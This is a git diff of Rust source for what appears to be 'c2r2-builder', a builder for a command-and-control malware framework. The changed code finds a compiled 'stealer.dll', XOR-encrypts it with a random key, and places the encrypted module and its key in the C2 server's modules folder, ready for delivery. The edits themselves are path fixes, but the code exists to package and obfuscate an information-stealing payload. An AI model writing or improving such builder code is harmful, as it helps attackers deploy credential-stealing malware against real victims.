@@ -6,7 +6,8 @@ mod dll_encrypt;
 use clap::{Parser, Subcommand};
 use encrypt::generate_agent;
 use dll_encrypt::{encrypt_dll, generate_random_key};
-use std::path::Path;
+use std::path::PathBuf;
+use std::env;
 
 #[derive(Parser)]
 #[command(name = "c2r2-builder")]
@@ -59,9 +60,32 @@ fn main() {
             println!("📦 Módulo: stealer");
             println!("{}", "-".repeat(50));
             
+            // Obtener el directorio raíz del workspace (desde CARGO_MANIFEST_DIR o current_dir)
+            let workspace_root = if let Ok(manifest_dir) = env::var("CARGO_MANIFEST_DIR") {
+                // Ejecutado con cargo run, manifest_dir apunta a builder/
+                PathBuf::from(manifest_dir).parent().unwrap().to_path_buf()
+            } else {
+                // Ejecutado como binario, usar current_dir y buscar Cargo.toml
+                let mut current = env::current_dir().expect("No se pudo obtener current_dir");
+                loop {
+                    if current.join("Cargo.toml").exists() {
+                        let content = std::fs::read_to_string(current.join("Cargo.toml"))
+                            .unwrap_or_default();
+                        if content.contains("[workspace]") {
+                            break;
+                        }
+                    }
+                    if !current.pop() {
+                        eprintln!("❌ Error: No se encontró el directorio raíz del workspace");
+                        std::process::exit(1);
+                    }
+                }
+                current
+            };
+            
             // Buscar DLL en target de Windows (cross-compilation desde Linux)
-            let dll_path_win = Path::new("../target/x86_64-pc-windows-gnu/release/stealer.dll");
-            let dll_path_native = Path::new("../target/release/stealer.dll");
+            let dll_path_win = workspace_root.join("target/x86_64-pc-windows-gnu/release/stealer.dll");
+            let dll_path_native = workspace_root.join("target/release/stealer.dll");
             
             let dll_path = if dll_path_win.exists() {
                 dll_path_win
@@ -80,8 +104,8 @@ fn main() {
             
             println!("📂 DLL encontrada: {}", dll_path.display());
             
-            let output_enc = Path::new("../c2r2-server/modules/stealer.enc");
-            let output_key = Path::new("../c2r2-server/modules/stealer.key");
+            let output_enc = workspace_root.join("c2r2-server/modules/stealer.enc");
+            let output_key = workspace_root.join("c2r2-server/modules/stealer.key");
             
             // Crear directorio modules si no existe
             if let Some(parent) = output_enc.parent() {
@@ -97,7 +121,7 @@ fn main() {
             let xor_key = generate_random_key(32);
             
             println!("\n📦 Encriptando stealer.dll...");
-            match encrypt_dll(dll_path, output_enc, &xor_key) {
+            match encrypt_dll(&dll_path, &output_enc, &xor_key) {
                 Ok(_) => println!("✅ DLL encriptada: {}", output_enc.display()),
                 Err(e) => {
                     eprintln!("❌ Error encriptando DLL: {}", e);
@@ -106,7 +130,7 @@ fn main() {
             }
             
             // Guardar clave
-            if let Err(e) = std::fs::write(output_key, &xor_key) {
+            if let Err(e) = std::fs::write(&output_key, &xor_key) {
                 eprintln!("❌ Error guardando clave: {}", e);
                 std::process::exit(1);
             }
